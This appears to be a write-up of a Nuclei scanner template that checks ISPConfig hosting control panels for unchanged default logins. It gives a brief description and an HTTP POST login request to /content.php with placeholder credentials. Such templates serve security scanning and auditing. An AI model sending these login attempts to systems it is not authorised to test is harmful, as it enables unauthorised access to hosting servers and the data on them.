# Nuclei Template: ISPConfig Hosting Control Panel - Default Login
**Template ID:** ispconfig-hcp-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`ispconfig-hcp-default-login.yaml`)

## Vulnerability Information & PoC

## Description
ISPConfig Hosting Control Panel Default Password Vulnerability exposes systems to unauthorized access, compromising data integrity and security.

## Steps to reproduce / Exploit Payload
```http
POST /content.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&passwort={{password}}&s_mod=login&s_pg=index
```

